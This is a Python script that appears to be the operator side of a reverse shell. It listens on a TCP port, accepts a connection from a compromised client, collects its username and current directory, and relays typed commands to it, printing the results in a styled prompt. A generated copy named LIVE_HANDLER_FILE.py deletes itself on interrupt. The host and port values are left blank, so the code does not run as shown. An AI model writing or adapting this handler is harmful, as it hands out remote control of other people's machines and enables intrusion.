#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import rich 
import socket
import readline
import subprocess as sb
from rich.console import Console 

console = Console()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

host_ip = 
host_port = 

s.bind((host_ip, host_port)) 

def main():
    print(f"server listening on {host_port}:{host_port}")
    try:
        s.listen(1) 
        client, ip = s.accept()
    except KeyboardInterrupt: 
        if os.path.basename(__file__) == "LIVE_HANDLER_FILE.py": 
            os.remove("LIVE_HANDLER_FILE.py")
            exit()
        else: 
            print("\nexiting...")
            exit()
    try: 
        while True: 
            client.sendall("GET LOGIN".encode())
            fgetlogin = client.recv(2048)
            getlogin = fgetlogin.decode()
            client.sendall("GET CWD".encode()) 
            fgetcwd = client.recv(2048) 
            getcwd = fgetcwd.decode()
            getlogin = fgetlogin.decode()
            console.print(f"\n┌─[bright_cyan]({getlogin})[/bright_cyan]──([bright_purple]{getcwd}[/bright_purple])")
            cmd = input("└> ")
            if cmd == "exit": 
                client.sendall("SERVER SHUTDOWN".encode())       
                s.close()
                exit()
            elif cmd == "clear": 
                sb.run("clear", shell=True)
                continue
            else: 
                client.sendall(cmd.encode()) 
                data = client.recv(8000000)
                if data == " ": 
                    continue
                elif data.decode().startswith("[red]") and data.decode().endswith("[/red]"):
                    console.print(data.decode())
                    continue
            print(data.decode())
    except KeyboardInterrupt as e:
        client.sendall("SERVER SHUTDOWN".encode()) 
        s.close()
        exit()

if __name__ == "__main__": 
    main()
